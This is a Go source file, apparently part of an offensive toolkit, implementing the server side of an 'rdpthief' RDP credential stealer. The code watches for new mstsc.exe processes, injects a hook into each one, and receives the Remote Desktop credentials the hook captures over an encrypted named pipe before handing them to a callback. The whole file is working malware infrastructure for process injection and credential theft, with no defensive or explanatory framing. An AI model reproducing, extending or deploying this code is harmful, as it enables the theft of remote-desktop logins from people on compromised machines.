package rdpthief

import (
	"context"
	"crypto/sha256"
	"io"
	"net"
	"sync"
	"time"

	"github.com/Microsoft/go-winio"

	"project/internal/convert"
	"project/internal/crypto/aes"
	"project/internal/logger"
	"project/internal/module/process"
	"project/internal/module/process/psmon"
	"project/internal/nettool"
	"project/internal/patch/msgpack"
	"project/internal/security"
	"project/internal/xpanic"
)

// Injector is used to inject hook to the mstsc process.
type Injector func(pid uint32, hook []byte) error

// Config contains configuration about rdpthief server.
type Config struct {
	PipeName string
	Password string
	Hook     []byte // resource
}

// Server is used to watch process list and inject hook
// to the new created process ("mstsc.exe").
type Server struct {
	logger   logger.Logger
	injector Injector
	callback Callback
	hook     *security.Bytes

	cbc      *aes.CBC
	psmon    *psmon.Monitor
	listener net.Listener

	closeOnce sync.Once
	wg        sync.WaitGroup
}

// NewServer is used to create a rdpthief server.
func NewServer(lg logger.Logger, inj Injector, cb Callback, cfg *Config) (*Server, error) {
	srv := Server{
		logger:   lg,
		injector: inj,
		callback: cb,
		hook:     security.NewBytes(cfg.Hook),
	}
	passHash := sha256.Sum256([]byte(cfg.Password))
	cbc, err := aes.NewCBC(passHash[:], passHash[:aes.IVSize])
	if err != nil {
		return nil, err
	}
	// create process monitor
	psmonOpts := psmon.Options{
		Interval: 250 * time.Millisecond,
	}
	monitor, err := psmon.New(lg, srv.psmonEventHandler, &psmonOpts)
	if err != nil {
		return nil, err
	}
	// create pipe listener
	listener, err := winio.ListenPipe(`\\.\pipe\`+cfg.PipeName, nil)
	if err != nil {
		return nil, err
	}
	srv.cbc = cbc
	srv.psmon = monitor
	srv.listener = listener
	// start serve
	srv.wg.Add(1)
	go srv.serve(listener)
	return &srv, nil
}

func (srv *Server) logf(lv logger.Level, format string, log ...interface{}) {
	srv.logger.Printf(lv, "rdpthief-server", format, log...)
}

func (srv *Server) log(lv logger.Level, log ...interface{}) {
	srv.logger.Println(lv, "rdpthief-server", log...)
}

func (srv *Server) psmonEventHandler(_ context.Context, event uint8, data interface{}) {
	if event != psmon.EventProcessCreated {
		return
	}
	for _, ps := range data.([]*process.PsInfo) {
		if ps.Name != "mstsc.exe" {
			continue
		}
		go func(ps *process.PsInfo) {
			srv.injectHook(ps)
		}(ps)
	}
}

func (srv *Server) injectHook(process *process.PsInfo) {
	defer func() {
		if r := recover(); r != nil {
			srv.log(logger.Fatal, xpanic.Print(r, "Server.injectHook"))
		}
	}()
	hook := srv.hook.Get()
	defer srv.hook.Put(hook)
	srv.log(logger.Critical, "start inject hook to process", process.PID)
	err := srv.injector(uint32(process.PID), hook)
	if err != nil {
		srv.logf(logger.Error, "failed to inject hook to process %d: %s", process.PID, err)
		return
	}
	srv.logf(logger.Critical, "inject hook to process %d successfully", process.PID)
}

func (srv *Server) serve(listener net.Listener) {
	defer srv.wg.Done()
	defer func() {
		if r := recover(); r != nil {
			srv.log(logger.Fatal, xpanic.Print(r, "Server.serve"))
		}
	}()

	pipePath := listener.Addr().String()
	srv.logf(logger.Info, "serve over pipe (%s)", pipePath)
	defer srv.logf(logger.Info, "pipe closed (%s)", pipePath)

	// start accept loop
	const maxDelay = time.Second
	var delay time.Duration // how long to sleep on accept failure
	for {
		conn, err := listener.Accept()
		if err != nil {
			// check error
			if ne, ok := err.(net.Error); ok && ne.Temporary() {
				if delay == 0 {
					delay = 5 * time.Millisecond
				} else {
					delay *= 2
				}
				if delay > maxDelay {
					delay = maxDelay
				}
				srv.logf(logger.Warning, "accept error: %s; retrying in %v", err, delay)
				time.Sleep(delay)
				continue
			}
			if nettool.IsNetClosingError(err) {
				return
			}
			srv.log(logger.Error, err)
			return
		}
		srv.wg.Add(1)
		go srv.handleClient(conn)
	}
}

func (srv *Server) handleClient(conn net.Conn) {
	defer srv.wg.Done()
	defer func() {
		if r := recover(); r != nil {
			srv.log(logger.Fatal, xpanic.Print(r, "Server.handleClient"))
		}
	}()
	defer func() { _ = conn.Close() }()

	sizeBuf := make([]byte, 4)
	_, err := io.ReadFull(conn, sizeBuf)
	if err != nil {
		srv.log(logger.Error, "failed to read size:", err)
		return
	}
	size := convert.BEBytesToUint32(sizeBuf)
	cipherData, err := security.ReadAll(conn, int64(size))
	if err != nil {
		srv.log(logger.Error, "failed to read cipher data:", err)
		return
	}
	plainData, err := srv.cbc.Decrypt(cipherData)
	if err != nil {
		srv.log(logger.Error, "failed to decrypt cipher data:", err)
		return
	}
	cred := new(Credential)
	err = msgpack.Unmarshal(plainData, cred)
	if err != nil {
		srv.log(logger.Error, "failed to unmarshal credential:", err)
		return
	}
	srv.log(logger.Critical, "steal credential")
	srv.callback(cred)
}

// Close is used to close rdpthief server.
func (srv *Server) Close() (err error) {
	srv.closeOnce.Do(func() {
		err = srv.psmon.Close()
		srv.psmon = nil
		e := srv.listener.Close()
		if e != nil && err == nil {
			err = e
		}
		srv.wg.Wait()
	})
	return
}
